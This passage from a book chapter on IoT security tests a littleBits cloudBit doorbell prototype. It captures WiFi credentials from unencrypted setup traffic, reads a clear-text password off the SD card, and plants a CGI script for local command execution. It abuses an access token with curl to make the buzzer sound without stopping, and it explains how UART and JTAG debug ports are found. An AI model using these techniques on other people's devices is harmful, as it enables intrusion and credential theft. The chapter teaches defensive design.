of the button module. The project should now look like Figure 7-18.
Figure 7-18. Doorbell prorotype using the cloudBit
Press the button and you should get a SMS on your cell phone as shown in Figure 7-19.
Introducing the cloudBit Starter Kit 
| 
233

Figure 7-19. SMS message alert from IFTTT
234 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

Even though we forgot to add in the button module initially, our oversight was easy to
fix by simply plugging in the module afterwards. We didn’t have to take any additional
steps with re-configuring cloudBit or re-programming our recipe. This makes littleBits
a powerful prototyping platform.
Security Evaluation
We now have a working prototype of a wireless doorbell that sends an SMS message
when pressed. Now is a good time for us to pause and think about security. An IoT
product that is susceptible to vulnerabilities can put potential customers at risk and also
taint the perception of the company. To approach our analysis, we will first go through
things we have learnt from security issues in other IoT products and see if our prototype
is vulnerable to similar issues. We will then discuss additional security mechanisms that
can be implemented to further secure the prototype and leverage existing IoT security
frameworks to make sure our approach is comprehensive.
WiFi Insecurity, Albeit Brief
One of the first things we did to create a working prototype was to configure the cloudBit
to hop onto our home WiFi by supplying credentials to the network (Figure 7-11). The
finished product will also require the customer to input their WiFi credentials in a
similar fashion. It is important for us to understand the potential abuse cases for this
design.
We had to join the temporary WiFi network exposed by our cloudBit to configure it.
Once on the cloudBit network, our browser connected to the cloudBit web server (with
IP address of 10.0.0.1) and requested the resource http://10.0.0.1/scan-wifi, the output
of which is shown in Figure 7-20.
Security Evaluation 
| 
235

Figure 7-20. cloudBit query to obtain list of WiFi networks in range
Once the browser obtains the list of networks from the cloudBit, it renders it to the user
(Figure 7-10). When the user selects their home network and enters their credentials
(Figure 7-11), the web browser sends the following HTTP request to the cloudBit on
the local network:
POST /set-wifi/ HTTP/1.1
Host: 10.0.0.1
Accept: */*
Proxy-Connection: keep-alive
Accept-Language: en-us
236 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: http://control.littlebitscloud.cc
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2)
AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18
Connection: keep-alive
Content-Length: 92
Referer: http://control.littlebitscloud.cc/
DNT: 1
ssid=TOUCHOFCLASS&mac=771FA1263FEC&security=wpa2&encryption=on
&password=topsecretpassword
Here is the response from cloudBit:
HTTP/1.1 200 OK
Access-Control-Allow-Headers: Authorization, Content-Type, If-None-Match
Access-Control-Allow-Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Origin: *
Access-Control-Expose-Headers: WWW-Authenticate, Server-Authorization
Access-Control-Max-Age: 86400
Content-Type: application/json; charset=utf-8
Date: Sun, 08 Mar 2015 05:34:07 GMT
Server: lighttpd/1.4.35
Content-Length: 20
{ "success": true }
After sending the response, the cloudBit will hop on the TouchOfClass WiFi network
using the credentials “topsecretpassword”. This lets the cloudBit reach the littleBits cloud
infrastructure, allowing us to control the module from the http://control.littlebit
scloud.cc website.
The security issue to keep in mind here is that the temporary WiFi network exposed by
cloudBits is not secured or encrypted. This means that anyone within range of the
temporary network can also join the network. Furthermore, the POST /set-wifi/ to
the cloudBit is not encrypted using TLS or any other mechanism, allowing a rogue party
that has joined the network to easily capture the user’s home network WiFi credentials.
The risk of this issue is relatively low since the attacker has to be within the vicinity of
the network and has to act within the window of time when the user configures his or
her cloudBit. However, as we have discussed in previous chapters, any computing device
that has been remotely compromised and is within vicinity can continuously scan for
temporary cloudBit WiFi networks and hop onto them to capture credentials, i.e. an
attacker with access to a computing device infected with malware can automate this
process by building the attack vector into the malware code. As IoT devices multiply in
our society, malware authors are going to design their malware to take advantage of
time windows such as these. Malware may infect a particular device and rely on an
already established WiFi connection, the password to which may be stored in encrypted
Security Evaluation 
| 
237

form. Therefore, obtaining the clear-text password to the WiFi network can provide
added advantage to remote attackers.
One solution here is to embed a unique private key in each instance of the product,
which may be expensive. Another option is to have a serial number printed on the device
that is used as a private key to encrypt the actual WiFi password. The user will have to
supply the WiFi password as well as the device’s serial number, which will be encrypted
by the web browser (using JavaScript) and sent to the cloudBit, which can then decrypt
it using its own serial number as the key. There are various ways encryption can lower
the risk of this issue. The important thing is for product manufacturers to acknowledge
the potential risk, the potential consequences, and make an informed business decision
on implementing security mechanisms to lower the risk to customers.
Sneaking in Command Execution
In Chapter 5, we discussed various scenarios where access to the file system can help
tinkerers and potential malicious entities discover how to bypass security controls and
uncover potential vulnerabilities. The cloudBit runs the Linux operating system and
includes a Secure Digital (SD) card that contains the file system. In this section, we will
attempt to mount this card and take a look at what’s inside.
Power off the project by separating the cloudBit from the button module. Carefully
remove the micro SD card implanted in the cloudBit, and then insert the card into a
laptop equipped with a micro SD card reader. The card should mount automatically in
most modern distributions. In OS X, you will need to install OSXFuse and fuse-ext2,
after which the disk should automatically mount in /Volumes/littleRoot/.
It’s a good idea to create a list of files that you can scroll through. Run the following
command in OS X:
$ *ls -lR /Volumes/littleRoot/* ~/Desktop/littleRoot.txt*
Then go through the ~/Desktop/littleRoot.txt to look for interesting files, such as
etc/wpa_supplicant/cloudbit.conf:
network={
        ssid="TOUCHOFCLASS"
        #psk="youcann0tguessme!"
        psk=3f6380509ca89b4c5506fd39e7a3a8b2d5cda338b51accbad1f1850fefbabd47
        key_mgmt=WPA-PSK
}
Here we have a situation where the WiFi password is stored in clear text. What’s more,
the PSK hash (calculated using the ssid and password) is also present. This creates a
situation where anyone with access to the doorbell can easily access the file system and
gain access to the customer’s home WiFi network. Stronger controls that store the key
in a secure hardware processor (such as the Apple A7 processor) would be a better
238 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

solution. Even though the product at hand is a mere doorbell, the security of the user’s
entire internal network could be put at risk by storing credentials such as the WiFi
password in the clear. Since the cloudBits platform is merely for prototyping, uncovering
issues like this is a good way to start to figure out security requirements early on.
The /srv/http directory contains files for the web server that is activated when the
cloudBit is in setup mode. We can put executable scripts in this directory to have com‐
mands run for us on the live instance of the cloudBit. Let’s give it a shot:
[bash]$ cd /Volumes/littleRoot/srv/http/set-wifi
Now put the following file (ps_netstat.cgi) into this directory:
#!/bin/bash
echo "Content-type: text/html"
echo ""
echo ""
echo '<html>'
echo '<body>'
echo '<pre>'
ps -aux
echo "<br><br><br>"
netstat -na
echo '</pre>'
echo '</body>'
echo '</html>'
Set the right permissions:
[bash] chown 33:_appstore ps_netstat.cgi
[bash] chmod 755 ps_netstat.cgi
Now unmount the micro SD card and insert it back into the cloudBit. Once the cloudBit
powers on, hold the “setup” button for a few seconds until the LED light blinks blue,
and then let go; the light will stop blinking. Join the temporary “littleBits_Cloud_…"”
WiFi network and browse to http://10.0.0.1/set-wifi/ps_netstat.cgi. You will see the
output from the ps and netstat command, as shown in Figure 7-21!
Security Evaluation 
| 
239

Figure 7-21. Successful execution of the ps and netstat commands
This is a crafty way to execute live commands on the cloudBit to analyze more details
in the device that are occurring in run-time. The designers of cloudBit do not want
people to directly execute local commands on it since it may destroy the integrity of the
product and as such it does not come with any way to remotely log in to the Linux system
running on it. In this case, we have found a way to bypass their intention and execute
local commands. This is yet another example of security issues we need to think about
during the prototyping state: is it important that external parties be unable to tinker
with the live system? In this case, the issue is that the file system is accessible by mounting
the memory card, which in turn allows anyone with access to the product to analyze
the system in real time. The case here is not to impose obscurity as the intention of
disallowing such tampering, but further protecting the product from a remote vulner‐
ability in the web server or other services that can lead to compromise of not just the
doorbell, but other important IoT devices (such as lighting and door locks) that may
share the local network.
240 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

One Token to Rule them All
Once the cloudBit is configured, you can browse to http://control.littlebitscloud.cc and
click on Settings to get the value of the DeviceID and AccessToken that is assigned to
your cloudBit (Figure 7-22).
Figure 7-22. AccessToken assigned to the cloudBit
The AccessToken can be used to interact with the cloudBit remotely. For example, the
link in the form of https://api-http.littlebitscloud.cc/devices/DeviceID/
input?access_token=AccessToken&token_type=bearer displays the status of the
cloudBit. This resource uses the cloudBit API to query the status of the cloudBit every
second. The first sequence of output shown in Figure 7-23 lists the value of percent as
100 because the button attached to the cloudBit was pressed, causing positive input to
be sent to the cloudBit. The second sequence lists the value as 0, indicating that the
button is not being pressed anymore.
Security Evaluation 
| 
241

Figure 7-23. Information about the connected cloudBit using the cloudBit API
We needed both the DeviceID and AccessToken to query information about the cloud‐
Bit from the API. However, if we only knew the AccessToken, we could obtain the
DeviceID by querying the devices associated with the user in this way:
$ curl -i -XGET -H "Authorization: Bearer [AccessToken DELETED]" -H
"Accept: application/vnd.littlebits.v2+json"
https://api-http.littlebitscloud.cc/devices
HTTP/1.1 200 OK
accept-ranges: bytes
access-control-allow-headers: Authorization, Content-Type, If-None-Match
access-control-allow-methods: GET, HEAD, POST, PUT, PATCH, DELETE, OPTIONS
access-control-allow-origin: *
access-control-expose-headers: WWW-Authenticate, Server-Authorization
access-control-max-age: 86400
cache-control: no-cache
content-type: application/json; charset=utf-8
Date: Thu, 02 Apr 2015 04:51:49 GMT
Content-Length: 272
Connection: keep-alive
[{"label":"SMS_Door_Bell","id":"[DELETED]","user_id":[DELETED],"is_connected":
true,"ap":{"ssid":"TOUCHOFCLASS","mac":"[DELETED]","strength":"99","server_id"
:"DfhIt25l","socket_id":"F1PDVb2Il","status":"2"},"subscriptions":[],
"subscribers":[],"input_interval_ms":750}]
The value of id returned from the curl command is the DeviceID that is associated
with the user’s account. This proves that the secrecy of the value of the AccessToken
ultimately guards access to the cloudBit. The cloudBit API advertises no way for de‐
velopers to request a new AccessToken. Without this functionality, the provided Ac
cessToken will persist forever. Given that littleBits and cloudBits platforms are not
intended for production use, there is low risk to the prototype itself. However, designers
242 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

should bake in methods for the final product to be able to expire and refresh the Ac
cessToken. This will prevent the token from persisting forever, which increases the
chance that it can be compromised.
Let’s add a buzzer module to our prototype. As shown in Figure 7-24, we attach the
buzzer module by snapping it into the right side of the cloudBit. Now our prototype
will be able to send an SMS when the button is pressed as well as activate a local audio
buzzer just like a traditional doorbell. This illustrates how powerful the littleBits pro‐
totyping platform is: designers can add and change functionality based on new ideas in
a matter of seconds.
Figure 7-24. Buzzer module added to the SMS Doorbell prototype
In order for our prototype to send an SMS and activate the buzzer, you will have to
create an extra IFTTT recipe that will need to select the cloudBit for both the input and
output sections (Figure 7-25).
Security Evaluation 
| 
243

Figure 7-25. Additional IFTTT recipe to sound buzzer
The final product may include a smartphone app that will have to store the token to the
local filesystem. If the app or the phone is compromised in any way, attackers can gain
access to the token. Another scenario could be the compromise of all issues AccessTo
ken values that are stored on the littleBits servers. This could allow an attacker to control
all cloudBit modules that are online. Once the initial prototype is complete, thinking
through such scenarios will help designers understand the importance of implementing
mechanisms for tokens to expire and be refreshed. In the case where a malicious entity
gains access to the token, a simple command such as the following will cause the pro‐
totype’s buzzer to sound infinitely in a screeching tone:
$ curl -i -XPOST -H "Authorization: Bearer [AccessToken DELETED]:
application/vnd.littlebits.v2+json"
https://api-http.littlebitscloud.cc/devices/[DeviceID DELETED]/output
-d percent=100 -d duration_ms=-1
HTTP/1.1 200 OK
access-control-allow-headers: Authorization, Content-Type, If-None-Match
access-control-allow-methods: GET, HEAD, POST, PUT, PATCH, DELETE, OPTIONS
access-control-allow-origin: *
access-control-expose-headers: WWW-Authenticate, Server-Authorization
244 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

access-control-max-age: 86400
cache-control: no-cache
content-type: application/json; charset=utf-8
Date: Thu, 02 Apr 2015 05:49:08 GMT
Content-Length: 16
Connection: keep-alive
Imagine waking up in the middle of the night with your doorbell screeching at you
nonstop. Some may have the courage to immediately check who is at the front door only
to be further confused after realizing there is no one there but the doorbell is still ringing.
These are the types of use cases—and abuse cases—designers need to begin to under‐
stand earlier on in their prototyping modules so that every subsequent iteration of their
product lowers the probability of their products being abused to harm or inconvenience
their customers.
Beware of Hardware Debug Interfaces
IoT devices often include hardware ports that are useful for debugging; they require
physical access to the device. Tinkerers and security researchers have found that it is
often possible to change the functionality of devices by using physical debug interfaces
to modify the firmware. It is also often possible to uncover stored secrets such as en‐
cryption keys that may be stored on the device. If the same encryption key is used on
all other device of the same type, attackers can use this information to compromise the
integrity of other devices by having one-time access to a candidate device and extracting
the information.
UARTs (Universal Asynchronous Receiver Transmitter) chips are commonly found on
microcontrollers and often leveraged to implement debug functionality. They use serial
(one bit at a time at a specified rate) communication to transmit information between
an attached client device and the microcontroller. The first order of business is to locate
the VCC (power), GND (ground), RX (receive), and TX (transmit) pins as shown in
Figure 7-26.
Security Evaluation 
| 
245

Figure 7-26. UART communication pins
Along with visual inspection, a multimeter is used to measure voltages to identify UART
pins. The multimeter should be set to continuity mode, which is a feature present in
most multimeters. This mode lets us test the resistance between two points on the board.
If there is low resistance, it means that the two points are connected electrically and the
multimeter will emit a tone. If the two points have high resistance between them, it
means that the circuit is open and the multimeter will not emit a tone.
To identify the ground pin, find an area on the board that has metal shielding (this
appears as a metal cover over parts of the board) and place the black colored multimeter
probe on it. Next, place the red probe on a pin that you suspect is the ground pin. If the
multimeter emits a tone it means that the pin is connected to ground and so it is the
ground pin. UART exposes four or more pins, so look for areas on the board that have
four or more pins next to each other.
If the red probe is placed on the power pin, the multimeter will emit a short beep rather
than a continuous tone. It is useful to identify the power pin even so we know it is not
a transmit or receive pin.
A transmit pin will cause the multimeter to show a voltage value of around 3.3, which
is common for UART. As the transmit pin transmits data (often when the device has
been powered on and it is booting firmware), the voltage drops to 0 and then back to
3.3. The multimeter will average the sampled voltage, which will dip down when data
is being transmitted, especially when the device has just been powered on.
Identifying the receive pin is more difficult, and the best course of action is to identify
it by eliminating the ground, power, and transmit pins.
In order to communicate with the UART, a simple UART-to-USB adapter can be used.
The ground pin on the board should be connected to the ground of the adapter, while
the transmit and receive pins should be switched.
246 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

A simple communications program such as Minicom can be used to connect and in‐
teract with the UART. However, we will have to tell Minicom exactly what baud rate to
use. (Baud is the unit for how many bits are transferred in a second.) The baudrate tool
can be used to automatically detect the baud rate and connect to the device.
The Reverse Engineering Serial Ports tutorial walks through how to locate UART pins
and connect to the UART of a hardware device in order to gain access to the system
shell on the device.
The Exploitee.rs website is a great resource that provides photos of identified UART
pins and baud rates for many popular devices. This information can be used to obtain
UART access to configure the devices, obtain firmware, and update firmware on devices
in order to insert additional features or bypass security controls and limitations designed
by the manufacturer.
The cloudBit module website states: “We’ve left pads on the bottom of
the board so that you can connect to the cloudBit’s serial console us‐
ing 3.3V UART (8-N-1, 115,200 baud) and poke around”. Readers that
have the UART hardware and software tools outlined in this chap‐
ter can use the baud settings listed (8-N-1, 115,200 baud) to tinker
with their cloudBit’s UART interface.
Another popular hardware debug interface is called JTAG, which stands for Joint Test
Action Group. There are various JTAG pin combinations. Most JTAG interfaces have
five basic pins: TDI (Test Data In), TDO (Test Data Out), TCK (Test Clock), TMS (Test
Mode Select), and TRST (Test Reset). Identifying these pins can become tedious, but
the popular JTAGultor hardware tool can automatically identify the pins. Joe Grand,
the creator of the tool explains how to use JTAGulator in this YouTube video.
The LIFX lightbulbs were found to use the JTAG interface by security researchers who
used the interface to uncover a security vulnerability. The LIFX architecture does not
require a hub like the Philips hue system. Instead, one lightbulb is connected to the WiFi
network and is deemed the master bulb. Other bulbs connect to the master bulb using
the 6LoWPAN standard (it stands for “IPv6 over Low Power Wireless Personal Area
Networks”). This allows the bulbs to use low power, especially when not illuminated,
and to extend their network via a mesh network to reach bulbs past the range of WiFi.
The researchers used the JTAG interface to obtain the firmware stored on the lightbulbs.
This firmware contained a global encryption key that was the same in all LIFX lightbulbs.
This symmetric encryption key is utilized to encrypt and decrypt communication be‐
tween all LIFX lightbulbs. Armed with this information, the researchers demonstrated
that they could inject arbitrary instructions into any LIFX mesh network allowing them
to command the lights. In this case, the attacker abusing this issue would have to be
within 30 meters of the LIFX bulbs, since the attack is conducted on the local network.
Security Evaluation 
| 
247

Interfaces such as UART and JTAG can be used to uncover security issues such as global
shared encryption keys, which are a bad idea since attackers can exploit the architecture
once the key is compromised. In the case of our cloudBits prototype, we came across
an issue where the local WiFi network was stored in clear text on disk. Stored secrets in
hardware platforms are a common issue and attackers are bound to attempt to uncover
them. In order to help promote better hardware security, the Trusted Computing Group
(TCG) has published and continues to update the Trusted Platform Module (TPM)
standard. The specifications provided by TCG allow hardware designers to construct a
secure hardware processor that can offer great reliability in storing secrets such as pass‐
words and encryption keys.
As designers and architects come closer to validating a proposed version of their device
past the initial prototyping stage, hardware security—including the availability of func‐
tionality via UART and JTAG—becomes a concern. It should be assumed that ethical
security researchers as well as attackers will tinker with debug access on hardware and
they will eventually gain access to the interface. One important item to remember is that
in the case of LIFX, the issue wasn’t that the JTAG interface exposed the encryption key,
but the fact that using the same encryption key in every light bulb is insecure design.
IoT product manufacturers should also think through secrets (such as WiFi credentials)
that their device must protect responsibly. Standards and processors that implement
TPM can and should be used to leverage hardware to store secrets more reliably so that
they are not present in the firmware or accessible using hardware debug interfaces.
Side Channel Attacks
In addition to debug interfaces and the secure storage of secrets in hardware, IoT hard‐
ware designers should also take into account side channel attacks, where information
gained from the physical aspects of the system is leveraged to break security controls
and potentially steal secrets such as passwords and encryption keys. Power analysis of
a computing system has been a popular flavor of side channel attack. The ChipWhis‐
perer suite of hardware and software tools can be used to analyze a particular device for
information leakage by analyzing its power consumption. Researchers have also been
able to use acoustics, i.e. the noise computing devices use during operation, to extract
and decipher encryption keys. The concept of side channel attacks has been known and
exploited in the past and it is important for IoT designers to make sure they understand
the various ways their hardware may leak information that can potentially be abused to
exploit the system.
Abuse Cases in the Context of Threat Agents
Coming up with abuse cases requires context to the threat agent who may act on vul‐
nerabilities. A threat agent is an individual or a group of people who may want to exploit
248 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

vulnerabilities for personal gain. Threat agents have differing levels of skills and inten‐
tions. For example, a gang of attackers with financial backing may employ persistent
and sophisticated tactics against specific assets, while a disgruntled employee may lev‐
erage confidential knowledge to cause disruption in service or loss of proprietary in‐
formation. The following sections contain examples of popular threat agents.
Nation States, Including the NSA
These are groups of highly sophisticated attackers that are funded by their governments.
Given the amount of financial baking and support available to them, Nation State at‐
tackers are highly persistent and continuously attempt to penetrate their target until
they are successful. They employ tactics that are difficult to detect, and they are deter‐
mined to maintain access to the compromised infrastructure for long periods of time.
This threat agent came to mainstream attention after the set of attacks against major
corporations that was named Operation Aurora. The attack was aimed at major cor‐
porations such as Google, Adobe Systems, Juniper Networks, Rackspace, Yahoo, Sy‐
mantec, Northrop Grumman, Morgan Stanley, and Dow Chemical. The Chinese gov‐
ernment was blamed for the attack, while the Chinese government in turn blamed the
United States for indulging in conspiracy.
The National Security Agency (NSA) is also a candidate for this category. Classified
information, leaked by the famous whistleblower Edward Snowden, demonstrate ex‐
tensive efforts by the NSA to spy on US citizens as well as launch targeted attacks against
foreign targets. The ethical implications of Snowden leaking the information may be
debatable, but the information he leaked helped the world realize the lengths to which
a government agency can go to spy on citizens and launch cyber attacks.
Snowden confirmed that the NSA worked with the government of Israel to write the
famous Stuxnet worm. Stuxnet targeted the Iranian nuclear program by infecting com‐
puters and destroying roughly a fifth of Iran’s nuclear centrifuges by causing them to
spin out of control. This is one of the most famous cyber-weapons and is an example
of how malware can cause physical damages to affect critical systems.
In February of 2015, researchers from Kaspersky Labs disclosed a powerful strain of
malware that could install a backdoor on the firmware of hard-drives manufactured by
companies like Seagate, Toshiba, and Western Digital. This backdoor is hard to detect
since it intercepts every attempt to read the hard drive to find the malicious code. Kas‐
persky noted that portions of the code in the backdoor are similar to modules found in
the design of Stuxnet. They further noted that infected machines were found in countries
that are common US spying targets, such as China, Iran, Pakistan, and Russia.
The increased popularity of IoT devices will definitely be an area of interest to the
organizations funded by nation states. They are known to want to steal trade secrets and
obtain access to critical facilities. They are likely to attempt to compromise entire plat‐
forms supporting IoT infrastructure by targeting supply chains to inject malicious code
Abuse Cases in the Context of Threat Agents 
| 
249

in hardware or software, or by remotely targeting the devices that offer Internet con‐
nectivity.
Terrorists
While terrorists are known to focus on physical attacks to promote terror, it is only a
matter of time before they increasingly begin to leverage vulnerabilities in infrastructure
accessible to the Internet. One recent example of this the 2013 attack against the New
York Times, Twitter, and the Huffington Post by supporters of the Syrian government
called the Syrian Electronic Army. The attackers were able to compromise the creden‐
tials used to set up DNS records for the domain names for the websites to cause dis‐
ruption of service.
Cyber terrorists will be drawn to the notion of leveraging IoT devices to promote fear
and disruption. Targeted attacks are likely to include individuals or families who are
well known so that the attacks will obtain news coverage, thereby promoting fear. Life-
sustaining health devices such as pacemakers are increasingly configurable remotely
and have been demonstrated to be vulnerable to attacks for a few years now.
The emergence of of smart cities, where similar technologies are used in tandem to
reduce resource consumption and promote well being, are also going to be of interest
to this group. High-rise condominiums and homes that support the concept of smart
cities are likely to use the same hardware products to increase efficiency and intero‐
perability. This means that a known vulnerability in a remotely accessible IoT device
can be leveraged across the city. Such scenarios are likely to be abused by these groups
to promote terror by causing blackouts, locking or unlocking doors, controlling cars,
and making fire alarms to go off. It is therefore important for designers to think through
the motives of possible agents who could be leveraging their devices.
It is clear how important it is for an IoT based lighting system architect to think through
such situations so that they are able to design security by proactively estimating ways
their products may be leveraged by malicious agents.
Criminal Organizations
Private criminal organizations have been known to be quite resourceful and sophisti‐
cated. The primary motive of this agent is financial gain by stealing intellectual property
(and selling it to the victim’s competitors) or money.
In February of 2015, the security firm Kaspersky announced that they had uncovered
criminal activity by an organization that was able to steal one billion dollars from banks
around the world by infecting computers with malware. Banks targeted included ones
in Russia, USA, Germany, China, Ukraine, Canada, Hong Kong, Taiwan, Romania,
France, Spain, Norway, India, the UK, Poland, Pakistan, Nepal, Morocco, Iceland, Ire‐
land, Czech Republic, Switzerland, Brazil, Bulgaria, and Australia. The average attack
250 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

yielded the criminals ten million dollars. The thieves were even able to seize control of
banks ATMs and ordered them to dispense cash at a pre-determined time.
Connected devices are fantastic targets for private criminal organizations because they
can help them gain a foothold into the target’s internal network. This access can be
further leveraged to attack workstations on the internal network to obtain access to
intellectual property and financial data. For example, attackers have been able to com‐
promise home refrigerators that have Internet connectivity. Attackers used the com‐
promised refrigerators to send out malicious emails to other potential victims to grow
their botnet. The term “thingbot” is gaining popularity to describe botnets that include
IoT devices that can be leveraged to attack organizations and targeted individuals.
Disgruntled or Nosy Employees
This group includes employees of an organization who may be disgruntled, nosy, or
whistleblowers. It is always easy to obtain access to devices that are on an internal net‐
work that one already has access to. Many organizations do not do a good job of de‐
signing role-based access controls that restrict access to company information based on
an employee’s role given the added cost of implementing and maintaining such controls.
In many cases, disgruntled employees already have legitimate access to data based on
their duties.
The data leak surrounding the 2014 attack on Sony Pictures caused the company to halt
the theater release of the movie “The Interview” because the attackers threatened phys‐
ical damages to movie theaters as well as leakage of additional data. Initially, the attack
was attributed to North Korea since the plot of the comedy movie includes the assassi‐
nation of Kim Jong-un. However, later speculation by industry experts has lent credi‐
bility to the notion that the attack was probably carried out by disgruntled individuals
who were former employees and knew the weaknesses of the company’s network in‐
frastructure that allowed them to access company data. The attackers obtained and
released copies of executive emails, including the one pictured in Figure 7-27. In this
email, a Sony executive and a prominent film producer exchanged messages about
President Obama that are racist in nature. Both the executives later issued a public
apology for engaging in the conversation.
Abuse Cases in the Context of Threat Agents 
| 
251

Figure 7-27. Internal email message between Sony Pictures executive leaked as part of
the attack
Actions committed by certain threat agents can lead to the compromise of personal or
corporate reputation, which in turn can lead to negative effects on the careers of exposed
individuals who have been targeted. Loss of brand reputation can also lead to loss of
consumer confidence that can have a long-term and sustained effect on business.
IoT manufacturers must think through how disgruntled employees with access to cus‐
tomer information may put confidential information at risk. Employees who are part
of design and the supply chain process should only be given access that pertains to their
role. The supply chain process should be securely engineered to make sure employees
are not able to tamper with software or hardware to install spyware or backdoor pro‐
grams. For example, an employee with access to source code that is used to push out
firmware updates for a baby monitor can sneak in a backdoor account that he or she
can later leverage to control and gain access to every baby monitor produced by the
company.
252 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

Employees involved in customer support often have access to customer accounts so that
they are able to troubleshoot situations to serve support requests. Customer support
agents in the case of an Internet-connected door lock company are likely to be able to
lock or unlock doors remotely. This ability could be a target of a social engineering
attack where the support representative may be tricked into opening a door lock be‐
longing to someone else. This situation can also be abused by the agent (who is dis‐
gruntled) to cause havoc by having all door locks that are online to unlock, thereby
increasing customer support calls, and putting customers at physical risk.
Abuse case analysis for this agent should include third-party contractors and partners.
It is important for IoT product designers to think through abuse cases in the context of
threat agents so that they are able to build controls into the devices as well as the back-
end infrastructure and processes supporting the products.
Hacktivists
A blend of the words “hack” and “activist”, groups of individuals in this category leverage
weaknesses in technology to promote a political agenda, often related to human rights
and freedom of information. The group known as Anonymous is one of the best ex‐
amples of hacktivists. They define themselves as “a very loose and decentralized com‐
mand structure that operates on ideas rather than directive”. The group’s name origi‐
nated from the 4chan website where users share various categories of images with each
other. The website doesn’t require registration and users who post messages are tagged
with the label “Anonymous”.
In 2008, Anonymous launched Project Chanology, which was an effort to retaliate
against the Church of Scientology for censorship. A private video starring actor Tom
Cruise discussing the virtues of Scientology was posted online by the Gawker website.
The video was initially hosted on YouTube and the Church of Scientology sent a copy‐
right infringement notice to have it removed. Anonymous considered this unfair cen‐
sorship and launched various denial of service attacks against scientology websites in
protest. They also prank called the church and sent in fax messages with black paper to
drain the ink from the church fax machines.
In November of 2010, WikiLeaks released hundreds of thousands of leaked US diplo‐
matic cables. Worried about possible legal threats from the US government, Amazon
pulled the plug on hosting the WikiLeaks website. Paypal, Mastercard, and Visa also cut
off service to the organization. As a result, members of Anonymous announced Oper‐
ation Avenge Assange in support of Julian Assange, founder of WikiLeaks. The group
launched denial of service attacks against Paypal, Mastercard, and Visa. The group could
not gather enough resources to bring down the Amazon infrastructure.
In early 2011, Aaron Barr, the CEO of the cyber-security company HBGary Federal,
claimed to have used social media platforms such as Facebook and Twitter to find out
the actual identities of some members of Anonymous. In response, members of Anony‐
Abuse Cases in the Context of Threat Agents 
| 
253

mous exploited a SQL injection vulnerability on one of HBGary’s systems and obtained
full-blown access. They compromised Barr’s Twitter account and even claimed to have
remotely wiped his iPad. They also released thousands of confidential emails that con‐
tained internal communications as well as details of HBGary’s customers. This led to
the resignation of Barr and the closure of HBGary Federal.
Hacktivist activity is often centered on disrupting businesses and targeting individuals
to gain media coverage and public attention. As such, IoT devices installed at the work‐
place and at home will be a lucrative target for this threat agent. Homes of specific
individuals will be targeted to compromise physical safety by abusing potential vulner‐
abilities in connected door locks and lighting systems. IoT devices such as baby monitors
and smart TVs are also likely to be targeted to obtain and leak confidential information.
Both consumers and designers of connected devices need to think through abuse cases
posed by Hacktvists to make sure the proper security controls are engineered and con‐
figured.
Vandals
Vandals are the most well known group since the dawn of the Internet. They aren’t
interested financial gain. Their primary objective is to prove that a system can be com‐
promised and they often like to take credit for demonstrating it. Even though their
intention is not to cause harm beyond obtaining a brief moment of fame, the outcomes
of their actions often do cost individuals and corporations money, distress, and loss of
reputation.
In April of 2015, the website of Tesla Motors was vandalized to display the content shown
in Figure 7-28 (courtesy of Reddit).
254 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

Figure 7-28. Twitter website compromised by vandals
The vandals also were able to compromise Tesla’s Twitter account and posted inappro‐
priate tweets along with one promising free cars (Figure 7-29).
Abuse Cases in the Context of Threat Agents 
| 
255

Figure 7-29. Twitter account of Tesla Motors was also compromised
256 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

The group compromised the Twitter account of Elon Musk (CEO of Tesla) as well and
tweeted messages from his account (Figure 7-30).
Figure 7-30. Twitter account of Elon Musk was hacked by the vandals
In response, Tesla issued the following press release:
_This case is under investigation, here’s what we know: Posing as a Tesla employee,
somebody called AT&T customer support and had them forward calls to an illegitimate
phone number. The impostor then contacted the domain registrar company that hosts
teslamotors.com, Network Solutions. Using the forwarded number, the imposter added
a bogus email address to the Tesla domain admin account. The impostor then reset the
password of the domain admin account, routed most of the website traffic to a spoof
website and temporarily gained access to Tesla’s and Elon’s Twitter accounts.
Some customers may have noticed temporary changes to www.teslamotors.com on their
browsers or experienced difficulty when using our mobile app to access Model S. Both
were due to teslamotors.com being re-routed.
Abuse Cases in the Context of Threat Agents 
| 
257

Our corporate network, cars and customer database remained secure throughout the
incident. We have restored everything back to normal. We are working with AT&T,
Network Solutions, and federal authorities to further investigate and take all necessary
actions to make sure this never happens again._
Most likely, the attacker was able to gain access to the legitimate Twitter account of Tesla
and that of Elon Musk is by redirecting email bound for the teslamotors.com domain
and resetting the Twitter password. Imagine how much other information this attacker
could have (and probably did) capture from redirecting corporate emails bound to Tesla.
While the attack was in progress, according to messages on the company’s message
board (Figure 7-31), Tesla car owners could not use the company’s iOS app to locate or
unlock their cars . The iOS app allows Tesla owners to locate, lock, unlock, and even
start their cars using their iPhones without having to have their key fob. Given the
increasing popularity and reliance of smart phones, many car owners are going to be
increasingly dependent on their phones to unlock and start their cars rather than carry
the key fob. This attack is a good example of how the simplest of social engineering
attacks can affect the ability of car owners to be able to use their cars.
Figure 7-31. Tesla owners were unable to use the iOS app while the attack was in pro‐
gress
Gaining access to the entire domain of teslamotors.com using a simple social engi‐
neering attack demonstrates how easy it can be to disrupt the security of major corpo‐
rations. Instead of vandalizing the website and Twitter accounts, the attacker could have
surreptitious maintained access for a prolonged period to steal intellectual property and
financial data. Vandalizing a popular website and Twitter accounts is bound to receive
immediate response from the security operations personnel at the company that is being
attached, causing the loophole to be closed. Attackers who want to cause severe financial
and business damage are unlikely to vandalize popular websites because they want to
maintain access for as long as possible. Vandals, however, thrive on media attention and
258 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

